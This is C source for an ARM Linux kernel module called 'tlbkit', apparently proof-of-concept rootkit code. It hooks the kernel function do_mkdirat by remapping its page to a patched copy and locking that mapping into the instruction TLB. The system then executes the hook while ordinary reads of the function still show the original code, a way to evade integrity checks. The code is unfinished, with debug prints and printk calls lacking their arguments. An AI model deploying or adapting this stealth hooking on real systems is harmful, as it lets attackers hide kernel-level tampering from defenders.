#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/vmalloc.h>      // vmalloc
#include <linux/slab.h>         // kmalloc
#include <linux/smp.h>          // smp_processor_id
#include <linux/mm.h>           // is_vmalloc_or_module_addr
// #include <linux/pgtable.h>   // set_pte_at NOT EXPORTED
#include <linux/pgtable.h>      // virt_to_kpte
#include <asm/proc-fns.h>       // set_pte_ext
#include <asm/ptrace.h>         // struct pt_regs
#include <asm/cacheflush.h>     // flush_cache_all
// #include <asm/tlbflush.h>    // flush_tlb_all NOT EXPORTED


#include "include/assembler.h"
#include "include/resolve_kallsyms.h"
#include "include/set_page_flags.h"
#include "linux/gfp.h"
#include "linux/preempt.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("wintermute");
MODULE_DESCRIPTION("tlbkit");
MODULE_VERSION("0.1");



extern int tlbkit_bad(uint32_t r0);

extern unsigned long tlbkit_read_itlb_lockdown(void);
extern unsigned long tlbkit_get_asid(void);
extern unsigned long tlbkit_read_c1(void);

extern void tlbkit_prefetch_itlb(uint32_t addr);
extern void tlbkit_lockdown_itlb_addr(uint32_t addr);



extern void handler_entry(void);
extern void __reloc0_handler_entry(void);

extern unsigned long __ret_addr_handler_entry;



// void (*tlbkit_set_pte_at)(struct mm_struct *, unsigned long, pte_t *, pte_t) = NULL;
void (*flush_tlb_all_exported)(void) = NULL;
int (*is_vmalloc_or_module_addr_exported)(const void *) = NULL;

// update if shellcode changed
#define TLBKIT_HOOK_LENGTH         (ARM_INST_WIDTH * 4)

// TODO: allow registering multiple handlers
// typedef void (*tlbkit_hook_handler_t)(struct pt_regs *regs);


void *internal_memcpy(void *dest, void *src, size_t n) {
    char *csrc = (char *) src;
    char *cdest = (char *) dest;
    size_t i = 0;

    for (i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
    return dest;
}

// void tlbkit_hook_handler_1(void) {
void tlbkit_hook_handler(struct pt_regs *regs) {
    printk(KERN_INFO "tlbkit: HOOK HANDLER\n");
    printk(KERN_INFO "tlbkit: tlbkit_get_asid: %lx\n", tlbkit_get_asid());
    printk(KERN_INFO "          regs->r0: %lx\n", regs->uregs[0]);
    printk(KERN_INFO "          regs->lr: %lx\n", regs->uregs[14]);
    // regs->uregs[0] = 123;
    // printk(KERN_INFO "          SET regs->r0 to %lx\n", regs->uregs[0]);

    return;
}

void tlbkit_place_hook(unsigned long addr) {
    unsigned long vaddr = addr;
    printk(KERN_INFO "tlbkit_place_hook: func_%lx\n", vaddr);

    int vaddr_is_1mb_section = is_1mb_section(vaddr);

    uint32_t vaddr_aligned;
    if(vaddr_is_1mb_section) {
        vaddr_aligned = ALIGN_TO_1MB(vaddr);
    }
    else {
        vaddr_aligned = ALIGN_TO_4KB(vaddr);
    }

    // check hooking non-page aligned funcs,
    printk(KERN_INFO "                   addr_aligned: %lx\n", vaddr_aligned);

    // make reloc page writeable
    flip_write_protect(handler_entry);
    flush_cache_all();
    flush_tlb_all_exported();

    // perform relocs
    memcpy(__reloc0_handler_entry, (void *) vaddr, TLBKIT_HOOK_LENGTH);
    __ret_addr_handler_entry = vaddr + TLBKIT_HOOK_LENGTH;

    flip_write_protect(handler_entry);
    flush_cache_all();
    flush_tlb_all_exported();

    printk(KERN_INFO "got here 0\n");

    unsigned long vaddr_aligned_bad;
    if(vaddr_is_1mb_section) {
        vaddr_aligned_bad = kmalloc(SECTION_SIZE, GFP_KERNEL); // GFP_KERNEL correct ?
    }
    else {
        vaddr_aligned_bad = kmalloc(PAGE_SIZE, GFP_KERNEL); // GFP_KERNEL correct ?
    }
    unsigned long paddr_bad = virt_to_phys(vaddr_aligned_bad);
    internal_memcpy(vaddr_aligned_bad, vaddr_aligned, SECTION_SIZE); // !! slow copy full orig page

    printk(KERN_INFO "got here 1\n");
    // copy hook, FLUSH CACHE !!
    // hook:
    //      push        {r0}
    //      mov32       r0, handler_entry
    //      mov32       r0, handler_entry ...
    //      bx          r0

    unsigned long vaddr_bad;
    if(vaddr_is_1mb_section) {
        vaddr_bad = vaddr_aligned_bad + (vaddr & ~SECTION_MASK);
    }
    else {
        vaddr_bad = vaddr_aligned_bad + (vaddr & ~PAGE_MASK);
    }

    *((uint32_t *) vaddr_bad) = 0xe52d0004;                                                     // push         {r0}
    assemble_mov32(handler_entry, 0, (uint32_t *)(vaddr_bad + ARM_INST_WIDTH));                 // mov32        r0, handler_entry
    *((uint32_t *)(vaddr_bad + ARM_INST_WIDTH + ARM_MOV32_LENGTH)) = 0xe12fff10;                // bx           r0
    flush_cache_all();
    flush_tlb_all_exported();

    printk(KERN_INFO "got here 2\n");

    preempt_disable();
    // replace phys
    // IMPORTANT: set_pte_ext applies to kernel pte metadata, NOT real pte
    //      see: https://elinux.org/Tims_Notes_on_ARM_memory_allocation
    pte_t pte_good = remap_phys_1mb(vaddr_aligned, paddr_bad);


    flush_cache_all();
    flush_tlb_all_exported();

    // DONE, behavior correct: TEST WITHOUT LOCKDOWN + prefetch
    // prefetch new phys to itlb
    printk(KERN_INFO "PRE LOCKDOWN ->  tlbkit_read_itlb_lockdown: %lx");
    tlbkit_lockdown_itlb_addr(vaddr); // TODO: for SMP systems do on all cores
    printk(KERN_INFO "POST LOCKDOWN -> tlbkit_read_itlb_lockdown: %lx");
    printk(KERN_INFO "[CORRECT?]        addr_bad: %lx, *addr_bad: %lx\n", vaddr_bad, *((uint32_t *) vaddr_bad));
    printk(KERN_INFO "[CORRECT?]        addr: %lx, *addr: %lx\n", vaddr, *((uint32_t *) vaddr));

    // restore orig phys
    set_pte_wrapper(vaddr, get_pte(vaddr), pte_good);

    flush_cache_all();
    flush_tlb_all_exported();

    preempt_enable();
}


static int __init tlbkit_init(void)
{
    printk(KERN_INFO "tlbkit: module loaded");
    printk(KERN_INFO "tlbkit: tlbkit_read_c1: %lx", tlbkit_read_c1());

    flush_tlb_all_exported = kallsyms_lookup_name_exported("flush_tlb_all");
    is_vmalloc_or_module_addr_exported = kallsyms_lookup_name_exported("is_vmalloc_or_module_addr");

    unsigned long __addr_do_mkdirat = kallsyms_lookup_name_exported("do_mkdirat");
    printk(KERN_INFO "tlbkit: PRE-HOOK\n");
    printk(KERN_INFO "          `func_%lx` not hooked\n", __addr_do_mkdirat);
    printk(KERN_INFO "          `func_%lx` entry read returns %lx\n", __addr_do_mkdirat, *((uint32_t *) __addr_do_mkdirat));

    tlbkit_place_hook(__addr_do_mkdirat);
    printk(KERN_INFO "tlbkit: POST-HOOK\n");
    printk(KERN_INFO "          `func_%lx` hooked\n", __addr_do_mkdirat);
    printk(KERN_INFO "          `func_%lx` entry read returns %lx\n", __addr_do_mkdirat, *((uint32_t *) __addr_do_mkdirat));

    return 0;
}

static void __exit tlbkit_exit(void)
{
    printk(KERN_INFO "tlbkit: module unloaded\n");
}

module_init(tlbkit_init);
module_exit(tlbkit_exit);
